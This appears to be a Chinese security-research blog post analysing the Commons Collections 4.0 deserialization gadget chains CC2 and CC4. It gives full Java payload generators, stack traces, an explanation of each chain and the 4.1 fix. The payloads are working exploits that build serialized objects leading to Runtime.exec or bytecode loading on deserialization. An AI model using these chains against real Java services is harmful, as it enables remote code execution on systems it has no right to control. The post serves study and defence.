---
title: CommonsCollections反序列化链分析
pubDatetime: 2025-11-25T00:00:00.000+08:00
description: CommonsCollections反序列化链分析
tags:
  - 反序列化
  - java
---
# CC2

## 利用条件
cc == 4.0
## payload
```java
package payloads;  
  
import org.apache.commons.collections4.Transformer;  
import org.apache.commons.collections4.functors.ConstantTransformer;  
import org.apache.commons.collections4.functors.InvokerTransformer;  
import org.apache.commons.collections4.comparators.ComparableComparator;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.ChainedTransformer;  
import utils.Reflection;  
import utils.Serializer;  
  
import java.util.PriorityQueue;  
  
public class CC4 {  
    public static Object getChainedTransformerFromCC4(String cmd){  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})  
        };  
        return new ChainedTransformer(transformers);  
    }  
    public static Object getChainedTransformerFromCC4(){  
        return getChainedTransformerFromCC4("calc");  
    }  
  
    public static void main(String[] args) throws Exception {  
        ComparableComparator comparator = new ComparableComparator(); // simple comparator  
        ChainedTransformer chainedTransformer = (ChainedTransformer) getChainedTransformerFromCC4();  
  
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer, comparator);  
//        transformingComparator.compare("whatever", "whatever"); 成功命令执行  
  
        PriorityQueue queue = new PriorityQueue();  
  
        Object[] innerArray = {"whatever", "whatever"};  
  
        Reflection.setFieldValue(queue, "comparator", transformingComparator);  
        Reflection.setFieldValue(queue, "queue", innerArray);  
        Reflection.setFieldValue(queue, "size", 2);  
  
        Serializer.serialize(queue);  
    }  
}
```
## 堆栈

```txt
at org.apache.commons.collections4.functors.ChainedTransformer.transform(ChainedTransformer.java:112)
at org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:722)
at java.util.PriorityQueue.siftDown(PriorityQueue.java:688)
at java.util.PriorityQueue.heapify(PriorityQueue.java:737)
at java.util.PriorityQueue.readObject(PriorityQueue.java:797)
```

## 原理
cc4.0给TransformingComparator添加了序列化接口，所以可以使用该链
TransformingComparator#compare方法会先对比较的两个对象调用transform，只要控制这里的transformer是我们的`chainedTransformer`即可
![](assets/CommonsCollections反序列化链分析/TransformingComparator-compare.png)

使用`PriorityQueue#readObject`调用到compare
## 修复方案
cc4.1直接取消了InvokerTransformer的Serializable接口, 序列化失败

![](assets/CommonsCollections反序列化链分析/InvokeTransformer.png)




# CC4
## 利用条件
CC == 4.0
## payload
```java
package payloads;  
  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import org.apache.commons.collections4.comparators.TransformingComparator;  
import org.apache.commons.collections4.functors.InstantiateTransformer;  
import utils.MyObjectFactory;  
import utils.Reflection;  
import utils.Serializer;  
  
import javax.xml.transform.Templates;  
import java.util.PriorityQueue;  
  
  
public class CC4 {  
    public static void main(String[] args) throws Exception {  
        Templates templates = MyObjectFactory.getTemplatesImpl();  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
//        Object obj = instantiateTransformer.transform(TrAXFilter.class);  // 成功执行命令  
  
        TransformingComparator transformingComparator =  new TransformingComparator(instantiateTransformer);  
        PriorityQueue queue =  new PriorityQueue();  
  
        Object[] innerArray = {TrAXFilter.class, TrAXFilter.class};  
  
        Reflection.setFieldValue(queue, "size", 2);  
        Reflection.setFieldValue(queue, "comparator", transformingComparator);  
        Reflection.setFieldValue(queue, "queue", innerArray);  
  
        Serializer.serialize(queue);  
    }  
}
```
## 堆栈
```txt
at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:455)
at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)
at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.<init>(TrAXFilter.java:58)
at sun.reflect.NativeConstructorAccessorImpl.newInstance0(NativeConstructorAccessorImpl.java:-1)
at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
at java.lang.reflect.Constructor.newInstance(Constructor.java:423)
at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:116)
at org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:32)
at org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
at java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:722)
at java.util.PriorityQueue.siftDown(PriorityQueue.java:688)
at java.util.PriorityQueue.heapify(PriorityQueue.java:737)
at java.util.PriorityQueue.readObject(PriorityQueue.java:797)
```
## 原理
InstantiateTransformer的transform方法通过反射调用类的初始化函数，获得对应类的实例。要求类和对应的初始化方法必须为`pulibc`
![](assets/CommonsCollections反序列化链分析/InstantiateTransformer.png)
所以我们可以达到初始化任意类，并且参数可控的效果。
根据[sink点](sink点#实例化任意类，参数可控)知道可以选用`TrAXFilter`类加载字节码并实例化
```java
public class CC4 {  
    public static void main(String[] args) throws Exception {  
        Templates templates = MyObjectFactory.getTemplatesImpl();  
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});  
        Object obj = instantiateTransformer.transform(TrAXFilter.class);  // 实例化TrAXFilter, 传入参数templates, 成功执行命令  
    }  
}
```
接下来就是触发transform，和CC2一样使用
`PriorityQueue->TransformingComparator#compare->transfrom`
## 修复方案
同CC2，去掉了InstantiateTransformer的Serializable接口
![](assets/CommonsCollections反序列化链分析/CC4.1下InstantiateTransformer.png)
